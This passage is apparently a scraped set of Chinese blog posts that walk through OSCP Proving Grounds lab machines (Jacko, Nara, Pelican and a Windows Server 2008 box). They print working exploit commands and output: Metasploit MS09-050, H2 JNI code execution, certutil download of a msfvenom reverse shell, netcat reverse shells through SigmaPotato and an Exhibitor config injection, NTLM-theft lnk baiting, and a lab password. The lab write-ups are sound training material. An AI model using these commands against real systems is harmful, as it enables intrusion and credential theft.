Windows Server (R) 2008 Standard 6001 Service Pack 1[-] 192.168.197.40:445 - Unable to find accessible named pipe![*] Exploit completed, but no session was created. 最后找到利用exploit https://github.com/d4t4s3c/Win7Blue 12345678910111213141516171819202122232425262728293031323334353637383940414243444546nc -nvlp 4444listening on [any] 4444 ...connect to [192.168.45.189] from (UNKNOWN) [192.168.197.40] 49159Microsoft Windows [Version 6.0.6001]Copyright (c) 2006 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&gt;whoamiwhoamint authority\\systemC:\\Windows\\system32&gt;lsls&#x27;ls&#x27; is not recognized as an internal or external command,operable program or batch file.C:\\Windows\\system32&gt;dir /s/b *.txtdir /s/b *.txtC:\\Windows\\system32\\catroot2\\dberr.txtC:\\Windows\\system32\\drivers\\gmreadme.txtC:\\Windows\\system32\\en-US\\license_addendum_1.txtC:\\Windows\\system32&gt;cd /users/cd /users/C:\\Users&gt;dir /s/b *.txtdir /s/b *.txtC:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Internet Explorer\\brndlog.txtC:\\Users\\Administrator\\Desktop\\network-secret.txtC:\\Users\\Administrator\\Desktop\\proof.txtC:\\Users\\All Users\\Microsoft\\Windows\\WER\\ReportQueue\\Report08b7d99c\\WERD5A6.tmp.version.txtC:\\Users\\All Users\\Microsoft\\Windows\\WER\\ReportQueue\\Report08b7d99c\\WERD5A7.tmp.appcompat.txtC:\\Users\\All Users\\VMware\\VMware Tools\\manifest.txtC:\\Users\\All Users\\VMware\\VMware Tools\\Unity Filters\\adobeflashcs3.txtC:\\Users\\All Users\\VMware\\VMware Tools\\Unity Filters\\adobephotoshopcs3.txtC:\\Users\\All Users\\VMware\\VMware Tools\\Unity Filters\\googledesktop.txtC:\\Users\\All Users\\VMware\\VMware Tools\\Unity Filters\\microsoftoffice.txtC:\\Users\\All Users\\VMware\\VMware Tools\\Unity Filters\\vistasidebar.txtC:\\Users\\All Users\\VMware\\VMware Tools\\Unity Filters\\visualstudio2005.txtC:\\Users\\All Users\\VMware\\VMware Tools\\Unity Filters\\vmwarefilters.txtC:\\Users\\All Users\\VMware\\VMware Tools\\Unity Filters\\win7gadgets.txtC:\\Users&gt;type C:\\Users\\Administrator\\Desktop\\proof.txttype C:\\Users\\Administrator\\Desktop\\proof.txt9e8e470108c09747401e1a87089c2583C:\\Users&gt; MS09-0501234567891011121314151617181920212223242526nmap -script=smb-vuln\\* -p445 192.168.197.40Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-06 11:29 CSTNmap scan report for 192.168.197.40Host is up (0.087s latency).PORT STATE SERVICE445/tcp open microsoft-dsHost script results:| smb-vuln-cve2009-3103:| VULNERABLE:| SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)| State: VULNERABLE| IDs: CVE:CVE-2009-3103| Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,| Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a| denial of service (system crash) via an &amp; (ampersand) character in a Process ID High header field in a NEGOTIATE| PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,| aka &quot;SMBv2 Negotiation Vulnerability.&quot;|| Disclosure date: 2009-09-08| References:| http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103|_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: EOF|_smb-vuln-ms10-054: false msf利用 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596[*] Exploit completed, but no session was created.msf6 exploit(windows/smb/ms17_010_psexec) &gt; search 09-050Matching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/smb/ms09_050_smb2_negotiate_func_index 2009-09-07 good No MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference 1 auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh . normal No Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference 2 auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff . normal No Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer DereferenceInteract with a module by name or index. For example info 2, use 2 or use auxiliary/dos/windows/smb/ms09_050_smb2_session_logoffmsf6 exploit(windows/smb/ms17_010_psexec) &gt; use exploit/windows/smb/ms09_050_smb2_negotiate_func_index[*] No payload configured, defaulting to windows/meterpreter/reverse_tcpmsf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) &gt; show optionsModule options (exploit/windows/smb/ms09_050_smb2_negotiate_func_index): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html RPORT 445 yes The target port (TCP) WAIT 180 yes The number of seconds to wait for the attack to complete.Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none) LHOST 10.0.0.82 yes The listen address (an interface may be specified) LPORT 4444 yes The listen portExploit target: Id Name -- ---- 0 Windows Vista SP1/SP2 and Server 2008 (x86)View the full module info with the info, or info -d command.msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) &gt; set lhost 192.168.45.189lhost =&gt; 192.168.45.189msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) &gt; set rhosts 192.168.197.40rhosts =&gt; 192.168.197.40msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) &gt; run[*] Started reverse TCP handler on 192.168.45.189:4444[*] 192.168.197.40:445 - Connecting to the target (192.168.197.40:445)...[*] 192.168.197.40:445 - Sending the exploit packet (951 bytes)...[*] 192.168.197.40:445 - Waiting up to 180 seconds for exploit to trigger...[*] Sending stage (176198 bytes) to 192.168.197.40[*] Meterpreter session 1 opened (192.168.45.189:4444 -&gt; 192.168.197.40:49159) at 2025-02-06 11:56:42 +0800meterpreter &gt; getuidServer username: NT AUTHORITY\\SYSTEMmeterpreter &gt; shellProcess 2684 created.Channel 1 created.Microsoft Windows [Version 6.0.6001]Copyright (c) 2006 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&gt;hostnamehostnameinternalC:\\Windows\\system32&gt;ipconfigipconfigWindows IP ConfigurationEthernet adapter Ethernet0: Connection-specific DNS Suffix . : IPv4 Address. . . . . . . . . . . : 192.168.197.40 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : 192.168.197.254Tunnel adapter Local Area Connection*: Media State . . . . . . . . . . . : Media disconnected Connection-specific DNS Suffix . :Tunnel adapter Local Area Connection* 9: Media State . . . . . . . . . . . : Media disconnected Connection-specific DNS Suffix . :C:\\Windows\\system32&gt; 反思 autorecon执行的是 123nmap -vv --reason -Pn -T4 -sV -p 445 &quot;--script=banner,(nbstat or smb* or ssl*) and not (brute or broadcast or dos or external or fuzzer)&quot; 192.168.197.40nmap &quot;--script=smb-vuln*&quot; -p445 192.168.197.40 发现的漏洞是ms17-010, 而 1nmap -script=smb-vuln\\* -p445 192.168.197.40 能扫到 ms09-050以后应该autorecon 扫一次， nmap再手动扫一次 后续测试： 1nmap &quot;--script=smb-vuln*&quot; -p445 192.168.197.40 也能扫到ms09-050 12345678910111213141516171819202122232425262728293031323334353637383940414243444546nmap -script=smb-vuln\\* -p445 192.168.197.40|_smb-vuln-ms10-054: false| smb-security-mode:| account_used: &lt;blank&gt;| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-time:| date: 2025-02-06T07:01:34|_ start_date: 2025-01-06T19:52:49| smb2-capabilities:| 2:0:2:|_ Distributed File System| smb-mbenum:|_ ERROR: Call to Browser Service failed with status = 2184| smb-vuln-cve2009-3103:| VULNERABLE:| SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)| State: VULNERABLE| IDs: CVE:CVE-2009-3103| Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,| Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a| denial of service (system crash) via an &amp; (ampersand) character in a Process ID High header field in a NEGOTIATE| PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,| aka &quot;SMBv2 Negotiation Vulnerability.&quot;|| Disclosure date: 2009-09-08| References:| https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103|_ http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103| smb-os-discovery:| OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)| OS CPE: cpe:/o:microsoft:windows_server_2008::sp1| Computer name: internal| NetBIOS computer name: INTERNAL\\x00| Workgroup: WORKGROUP\\x00|_ System time: 2025-02-05T23:06:38-08:00|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED| smb-brute:|_ guest:&lt;blank&gt; =&gt; Valid credentials, account disabled|_smb-print-text: false|_smb-flood: ERROR: Script execution failed (use -d to debug)| smb-vuln-ms17-010:| VULNERABLE:| Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)| State: VULNERABLE 多扫几次？","categories":[{"name":"What We Do-三天打鱼","slug":"What-We-Do-三天打鱼","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/"},{"name":"OSCP","slug":"What-We-Do-三天打鱼/OSCP","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/"},{"name":"PG Lab","slug":"What-We-Do-三天打鱼/OSCP/PG-Lab","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/PG-Lab/"}],"tags":[]},{"title":"Proving Grounds Practice - Jacko","date":"2025-03-10T18:47:53.000Z","path":"post/20250311024753.html","text":"scan1sudo autorecon 192.168.197.66 123456789101112131415161718192021222324OS: Windows 10, Windows Server 2019, Windows Server 2016OS version: &#x27;10.0&#x27;OS release: &#x27;1903&#x27;OS build: &#x27;18362&#x27;-80 IIS 10.0 TITLE: H2 Database Engine- 135 msrpc- 139 netbios-ssn- 445 SMB V2.02 2.1 3.0 3.1- 5040 unknown- 7680 tcpwrapped- 8082 H2 database http console- 9092 XmlIpcRegSvc- 49xxx msrpc footholdsmb-vuln123456789nmap &quot;--script=smb-vuln*&quot; -p445 192.168.197.55 -PnStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-06 19:49 CSTNmap scan report for 192.168.197.55Host is up.PORT STATE SERVICE445/tcp filtered microsoft-dsNmap done: 1 IP address (1 host up) scanned in 2.23 seconds web目录扫描80端口 1234567891011121314151617181920212223242526272829303132gobuster dir -w /usr/share//wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.197.66:80 -t 40===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.197.66:80[+] Method: GET[+] Threads: 40[+] Wordlist: /usr/share//wordlists/dirbuster/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.6[+] Timeout: 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/images (Status: 301) [Size: 155] [--&gt; http://192.168.197.66:80/images/]/help (Status: 301) [Size: 153] [--&gt; http://192.168.197.66:80/help/]/html (Status: 301) [Size: 153] [--&gt; http://192.168.197.66:80/html/]/Images (Status: 301) [Size: 155] [--&gt; http://192.168.197.66:80/Images/]/text (Status: 301) [Size: 153] [--&gt; http://192.168.197.66:80/text/]/Help (Status: 301) [Size: 153] [--&gt; http://192.168.197.66:80/Help/]/HTML (Status: 301) [Size: 153] [--&gt; http://192.168.197.66:80/HTML/]/IMAGES (Status: 301) [Size: 155] [--&gt; http://192.168.197.66:80/IMAGES/]/Text (Status: 301) [Size: 153] [--&gt; http://192.168.197.66:80/Text/]/Html (Status: 301) [Size: 153] [--&gt; http://192.168.197.66:80/Html/]/javadoc (Status: 301) [Size: 156] [--&gt; http://192.168.197.66:80/javadoc/]/TEXT (Status: 301) [Size: 153] [--&gt; http://192.168.197.66:80/TEXT/]/HELP (Status: 301) [Size: 153] [--&gt; http://192.168.197.66:80/HELP/]Progress: 220560 / 220561 (100.00%)===============================================================Finished=============================================================== 8082端口 12345678910111213141516171819gobuster dir -w /usr/share//wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.197.66:8082 -t 40===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.197.66:8082[+] Method: GET[+] Threads: 40[+] Wordlist: /usr/share//wordlists/dirbuster/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.6[+] Timeout: 10s===============================================================Starting gobuster in directory enumeration mode===============================================================Progress: 220560 / 220561 (100.00%)===============================================================Finished=============================================================== 没有什么有用信息。8082端口h2 database 点击connect可以直接进入， 版本号1.4.199searchsploit搜索一下已知漏洞 123456789101112ss h2 database---------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path---------------------------------------------------------------------------------------------------------------------------------- ---------------------------------H2 Database - &#x27;Alias&#x27; Arbitrary Code Execution | java/local/44422.pyH2 Database 1.4.196 - Remote Code Execution | java/webapps/45506.pyH2 Database 1.4.197 - Information Disclosure | linux/webapps/45105.pyH2 Database 1.4.199 - JNI Code Execution | java/local/49384.txtOracle Database 10 g - XML DB xdb.xdb_pitrig_pkg Package PITRIG_TRUNCATE Function Overflow | multiple/remote/31010.sql---------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No ResultsPapers: No Results 依次输入payload,成功执行命令，当前用户名为tony msfvenom生成反弹shell exe 1msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.189 LPORT=4444 -f exe -o ~/Tools/windows/r.exe 上传并执行， 上传 wget iwr 都无法执行，提示cannot find,使用certutil下载文件 123certutil.exe -urlcache -f http://192.168.45.189/r.exe C:\\Users\\tony\\r2.exeCALL JNIScriptEngine_eval(&#x27;new java.util.Scanner(java.lang.Runtime.getRuntime().exec(&quot;C:\\Users\\tony\\r2.exe&quot;).getInputStream()).useDelimiter(&quot;\\\\Z&quot;).next()&#x27;); 根据错误提示发现\\被过滤了, 尝试url编码也无法执行。最后添加一个\\后执行成功， 后来看官方walkthrough,使用的是 &#x2F; ,但是经过测试还是无法执行 123certutil.exe -urlcache -f http://192.168.45.189/r.exe C:\\\\Users\\\\tony\\\\r2.exeCALL JNIScriptEngine_eval(&#x27;new java.util.Scanner(java.lang.Runtime.getRuntime().exec(&quot;C:\\\\Users\\\\tony\\\\r2.exe&quot;).getInputStream()).useDelimiter(&quot;\\\\Z&quot;).next()&#x27;); 12345678nc -nvlp 4444listening on [any] 4444 ...connect to [192.168.45.189] from (UNKNOWN) [192.168.197.66] 50325Microsoft Windows [Version 10.0.18363.836](c) 2019 Microsoft Corporation. All rights reserved.C:\\Program Files (x86)\\H2\\service&gt;cd /users/tonycd /users/tony 遇到奇怪的问题，发现whoami, net user 命令都无法执行， 添加环境变量后仍无法执行 12345678910111213C:\\Program Files (x86)&gt;whoamiwhoamiC:\\Program Files (x86)&gt;tasklisttasklistC:\\Program Files (x86)&gt;set PATH=%PATH%;C:\\windows\\system32;C:\\windows;C:\\windows\\System32\\Wbem;C:\\windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\windows\\System32\\OpenSSH\\;C:\\Program Files\\dotnet\\set PATH=%PATH%;C:\\windows\\system32;C:\\windows;C:\\windows\\System32\\Wbem;C:\\windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\windows\\System32\\OpenSSH\\;C:\\Program Files\\dotnet\\C:\\Program Files (x86)&gt;whoamiwhoamiC:\\Program Files (x86)&gt;^C escalation上传winPeas收集信息 123456789Current Token privileges�Check if you can escalate privilege using some enabled token https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#token-manipulation SeShutdownPrivilege: DISABLED SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED SeUndockPrivilege: DISABLED SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED SeIncreaseWorkingSetPrivilege: DISABLED SeTimeZonePrivilege: DISABLED 上传 SweetPotato.exe 和 nc, 使用SweetPotato无法利用成功，并且shell会卡死，在medium上的wirteup, 使用godPotato也有卡死的问题 1234567891011C:\\Users\\tony&gt;.\\SweetPotato.exe -a &quot;whoami&quot;.\\SweetPotato.exe -a &quot;whoami&quot;Modifying SweetPotato by Uknow to support webshellGithub: https://github.com/uknowsec/SweetPotatoSweetPotato by @_EthicalChaos_ Orignal RottenPotato code and exploit by @foxglovesec Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery PrintSpoofer discovery and original exploit by @itm4n[+] Attempting NP impersonation using method PrintSpoofer to launch c:\\Windows\\System32\\cmd.exeCan&#x27;t find endpoint for 12345678-1234-abcd-ef00-0123456789ab 1.0 with protocol sequence ncalrpc[!] No authenticated interception took place, exploit failed 改用SigmaPotato利用成功，不过还是存在同样的问题whoami无法执行，不过算是拿到了flag 1234567891011121314C:\\Users\\tony&gt;.\\SigmaPotato &quot;.\\nc 192.168.45.189 4443 -e cmd&quot;.\\SigmaPotato &quot;.\\nc 192.168.45.189 4443 -e cmd&quot;[+] Starting Pipe Server...[+] Created Pipe Name: \\\\.\\pipe\\SigmaPotato\\pipe\\epmapper[+] Pipe Connected![+] Impersonated Client: NT AUTHORITY\\NETWORK SERVICE[+] Searching for System Token...[+] PID: 788 | Token: 0x772 | User: NT AUTHORITY\\SYSTEM[+] Found System Token: True[+] Duplicating Token...[+] New Token Handle: 948[+] Current Command Length: 31 characters[+] Creating Process via &#x27;CreateProcessWithTokenW&#x27;[+] Process Started with PID: 2344 123456789101112nc -nvlp 4443listening on [any] 4443 ...connect to [192.168.45.189] from (UNKNOWN) [192.168.197.66] 50405Microsoft Windows [Version 10.0.18363.836](c) 2019 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&gt;whoamiwhoamiC:\\Windows\\system32&gt;cd /userscd /users 官方workThrough利用的是CVE-2018-16156， 不过PaperStream IP 进程有漏洞也太难发现了，winPeas也没有收集到这个漏洞，需要积累经验 反思 脑子要灵光，看到执行时\\被过滤了，应该要想到下载的时候也需要加一个 提权时，不能只有之前学的东西，一味地翻笔记，创建backdoor用户，加入administrator, 添加到rdp组，一通操作下来发现连3389端口都没开放，不知道在干些什么，反弹shell只想着nc, msfvenom直接生成exe啊，直接用","categories":[{"name":"What We Do-三天打鱼","slug":"What-We-Do-三天打鱼","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/"},{"name":"OSCP","slug":"What-We-Do-三天打鱼/OSCP","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/"},{"name":"PG Lab","slug":"What-We-Do-三天打鱼/OSCP/PG-Lab","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/PG-Lab/"}],"tags":[]},{"title":"Proving Grounds Practice - Nara","date":"2025-03-10T18:47:53.000Z","path":"post/20250311024753.html","text":"Difficultyeasy categoriesAD Scan 53 dig axfr12345678910dig AXFR -p 53 @192.168.178.30;; communications error to 192.168.178.30#53: timed out; &lt;&lt;&gt;&gt; DiG 9.20.2-1-Debian &lt;&lt;&gt;&gt; AXFR -p 53 @192.168.178.30; (1 server found);; global options: +cmd;; Query time: 4718 msec;; SERVER: 192.168.178.30#53(192.168.178.30) (UDP);; WHEN: Sat Mar 15 09:20:53 CST 2025;; MSG SIZE rcvd: 28 ldapsearch12345678910111213141516ldapsearch -H ldap://192.168.178.30 -x -b &quot;DC=nara-security,DC=com&quot; |tee ldap_dump# extended LDIF## LDAPv3# base &lt;DC=nara-security,DC=com&gt; with scope subtree# filter: (objectclass=*)# requesting: ALL## search resultsearch: 2result: 1 Operations errortext: 000004DC: LdapErr: DSID-0C090AC9, comment: In order to perform this opera tion a successful bind must be completed on the connection., data 0, v4f7c# numResponses: 1 smbclient12345678910111213smbclient -L //192.168.178.30 -N Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC nara Disk company share NETLOGON Disk Logon server share SYSVOL Disk Logon server share ^[[AReconnecting with SMB1 for workgroup listing.do_connect: Connection to 192.168.178.30 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)Unable to connect with SMB1 -- no workgroup available get Important.txt 123456789101112131415161718192021222324252627smbclient //192.168.178.30/nara -NTry &quot;help&quot; to get a list of possible commands.smb: \\&gt; ls . D 0 Sun Jul 30 22:31:58 2023 .. DHS 0 Sat Mar 15 09:18:08 2025 Documents D 0 Sun Jul 30 22:03:13 2023 Important.txt A 2200 Sun Jul 30 22:05:31 2023 IT D 0 Mon Jul 31 00:22:50 2023 7699711 blocks of size 4096. 4153067 blocks availablesmb: \\&gt; get Important.txt getting file \\Important.txt of size 2200 as Important.txt (2.9 KiloBytes/sec) (average 2.9 KiloBytes/sec)smb: \\&gt; cd Documents\\lssmb: \\Documents\\&gt; ls . D 0 Sun Jul 30 22:03:13 2023 .. D 0 Sun Jul 30 22:31:58 2023 7699711 blocks of size 4096. 4152768 blocks availablesmb: \\Documents\\&gt; cd ..smb: \\&gt; cd ITsmb: \\IT\\&gt; ls . D 0 Mon Jul 31 00:22:50 2023 .. D 0 Sun Jul 30 22:31:58 2023 7699711 blocks of size 4096. 4152768 blocks availablesmb: \\IT\\&gt; exit 提示员工要经常检查shared documents下的文件 1234567891011121314151617181920cat Important.txt Dear Team,We hope this message finds you well. We wanted to remind all employees to take a moment each day to check the shared documents folder diligently. As part of our commitment to streamline processes and enhance efficiency, important documents are frequently uploaded to this folder for your attention and action.The shared documents folder serves as a central hub for crucial updates, contracts, agreements, and various other essential materials requiring your attention. To ensure that you don&#x27;t miss any critical information, please make it a habit to access the folder at the beginning of your workday or as often as possible.Here are a few simple steps to stay up-to-date and ensure timely actions:* Access the Shared Documents Folder: Log in to your company account and navigate to the designated shared documents folder. If you encounter any issues accessing the folder, please reach out to the IT department for assistance.* Review New Additions: Look for any new documents that might have been uploaded since your last visit. These documents might require your signature, feedback, or acknowledgment.* Take Action Promptly: If there are documents that need your attention, please act promptly and follow the necessary procedures as indicated within each document. Whether it&#x27;s a signature, a comment, or any other form of response, timely actions are vital to keep our operations running smoothly.* Seek Clarification: If you encounter any uncertainty or have questions about the documents you find, don&#x27;t hesitate to reach out to the relevant department or the person mentioned in the document for clarification. It&#x27;s essential that you fully understand what&#x27;s required before proceeding.Remember, staying informed and acting promptly ensures that projects progress seamlessly, contracts get executed on time, and the company as a whole operates efficiently. Your cooperation in this matter is greatly appreciated and contributes to our collective success.Thank you for your attention to this matter, and if you have any concerns or suggestions to improve our document management process, please share them with your department head or the HR team. Footholdsmb html stealsmbclient put test.txt 发现有上传文件权限, 使用ntlm-theft.py生成 lnk文件，上传到documents文件夹下，等待倒霉蛋点击执行 1234567891011121314151617181920212223python3 ntlm_theft.py -g all -s 192.168.45.241 -f testCreated: test/test.scf (BROWSE TO FOLDER)Created: test/test-(url).url (BROWSE TO FOLDER)Created: test/test-(icon).url (BROWSE TO FOLDER)Created: test/test.lnk (BROWSE TO FOLDER)Created: test/test.rtf (OPEN)Created: test/test-(stylesheet).xml (OPEN)Created: test/test-(fulldocx).xml (OPEN)Created: test/test.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)Created: test/test-(includepicture).docx (OPEN)Created: test/test-(remotetemplate).docx (OPEN)Created: test/test-(frameset).docx (OPEN)Created: test/test-(externalcell).xlsx (OPEN)Created: test/test.wax (OPEN)Created: test/test.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)Created: test/test.asx (OPEN)Created: test/test.jnlp (OPEN)Created: test/test.application (DOWNLOAD AND OPEN)Created: test/test.pdf (OPEN AND ALLOW)Created: test/zoom-attack-instructions.txt (PASTE TO CHAT)Created: test/Autorun.inf (BROWSE TO FOLDER)Created: test/desktop.ini (BROWSE TO FOLDER)Generation Complete. 123456789smb: \\&gt; cd Documents\\smb: \\Documents\\&gt; put test.lnk putting file test.lnk as \\Documents\\test.lnk (3.8 kb/s) (average 1.7 kb/s)smb: \\Documents\\&gt; ls . D 0 Sat Mar 15 13:48:09 2025 .. D 0 Sat Mar 15 13:42:07 2025 test.lnk A 2164 Sat Mar 15 13:48:10 2025 7699711 blocks of size 4096. 3506757 blocks available kali 启动 responder, 稍等片刻获取到Tracy.White的ntlm hash 使用hashcat破解 hashcat white.hash /usr/share/wordlists/rockyou.txt 使用用户名密码发现winrm、rdp都无法登录 bloodhound接下来利用bloodhound-python看下有没有可以利用的点 1bloodhound-python -dns-tcp -ns 192.168.178.30 -d nara-security.com -u Tracy.White -p zqwj041FGX -c all 把所有json文件导入bloodhound中，看看White拥有什么权限 对remote access有完全控制权，按照利用方式，没有成功， ladpmodify12345cat groupadd.ldif dn: CN=Remote Access,OU=remote,DC=nara-security,DC=comchangetype: modifyadd: membermember: CN=Tracy White,OU=staff,DC=nara-security,DC=com ldapmodify -x -D &quot;``Tracy.White@nara-security.com``&quot; -w zqwj041FGX -H ldap://``nara-security.com -f groupadd.ldif 接下来使用evil-winrm登录, 12345678910111213141516evil-winrm -i 192.168.178.30 -u &quot;Tracy.White&quot; -p &quot;zqwj041FGX&quot;*Evil-WinRM* PS C:\\Users\\tracy.white\\Documents&gt; whoaminarasec\\tracy.white*Evil-WinRM* PS C:\\Users\\tracy.white\\Documents&gt; ls Directory: C:\\Users\\tracy.white\\DocumentsMode LastWriteTime Length Name---- ------------- ------ -----a---- 7/30/2023 3:05 PM 373 automation.txt*Evil-WinRM* PS C:\\Users\\tracy.white\\Documents&gt; cat automation.txtEnrollment Automation Account01000000d08c9ddf0115d1118c7a00c04fc297eb0100000001e86ea0aa8c1e44ab231fbc46887c3a0000000002000000000003660000c000000010000000fc73b7bdae90b8b2526ada95774376ea0000000004800000a000000010000000b7a07aa1e5dc859485070026f64dc7a720000000b428e697d96a87698d170c47cd2fc676bdbd639d2503f9b8c46dfc3df4863a4314000000800204e38291e91f37bd84a3ddb0d6f97f9eea2b Nice Walkthrough https://hackmd.io/@Abzee/Nara?utm_source=preview-mode&amp;utm_medium=rec","categories":[{"name":"What We Do-三天打鱼","slug":"What-We-Do-三天打鱼","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/"},{"name":"OSCP","slug":"What-We-Do-三天打鱼/OSCP","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/"},{"name":"PG Lab","slug":"What-We-Do-三天打鱼/OSCP/PG-Lab","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/PG-Lab/"}],"tags":[]},{"title":"Proving Grounds Practice - Pelican","date":"2025-03-10T18:47:53.000Z","path":"post/20250311024753.html","text":"信息收集 zookeeper 版本1.0 foothold https://www.exploit-db.com/exploits/48654 1curl -X POST http://192.168.180.98:8080/exhibitor/v1/config/set -d &#x27;&#123; &quot;zookeeperInstallDirectory&quot;: &quot;/opt/zookeeper&quot;, &quot;zookeeperDataDirectory&quot;: &quot;/opt/zookeeper/snapshots&quot;, &quot;zookeeperLogDirectory&quot;: &quot;/opt/zookeeper/transactions&quot;, &quot;logIndexDirectory&quot;: &quot;/opt/zookeeper/transactions&quot;, &quot;autoManageInstancesSettlingPeriodMs&quot;: &quot;0&quot;, &quot;autoManageInstancesFixedEnsembleSize&quot;: &quot;0&quot;, &quot;autoManageInstancesApplyAllAtOnce&quot;: &quot;1&quot;, &quot;observerThreshold&quot;: &quot;0&quot;, &quot;serversSpec&quot;: &quot;1:exhibitor-demo&quot;, &quot;javaEnvironment&quot;: &quot;$(busybox nc -e /bin/sh 192.168.45.152 3333 &amp;)&quot;, &quot;log4jProperties&quot;: &quot;&quot;, &quot;clientPort&quot;: &quot;2181&quot;, &quot;connectPort&quot;: &quot;2888&quot;, &quot;electionPort&quot;: &quot;3888&quot;, &quot;checkMs&quot;: &quot;30000&quot;, &quot;cleanupPeriodMs&quot;: &quot;300000&quot;, &quot;cleanupMaxFiles&quot;: &quot;20&quot;, &quot;backupPeriodMs&quot;: &quot;600000&quot;, &quot;backupMaxStoreMs&quot;: &quot;21600000&quot;, &quot;autoManageInstances&quot;: &quot;1&quot;, &quot;zooCfgExtra&quot;: &#123; &quot;tickTime&quot;: &quot;2000&quot;, &quot;initLimit&quot;: &quot;10&quot;, &quot;syncLimit&quot;: &quot;5&quot;, &quot;quorumListenOnAllIPs&quot;: &quot;true&quot; &#125;, &quot;backupExtra&quot;: &#123; &quot;directory&quot;: &quot;&quot; &#125;, &quot;serverId&quot;: 1 &#125;&#x27; 或页面操作 得到charles账号 privilege escalationsudogcore https://gtfobins.github.io/gtfobins/gcore/ https://wiki.sentnl.io/security/hacking-demos/getting-passwords-of-logged-in-users 12345sudo gcore 513strings core.513su 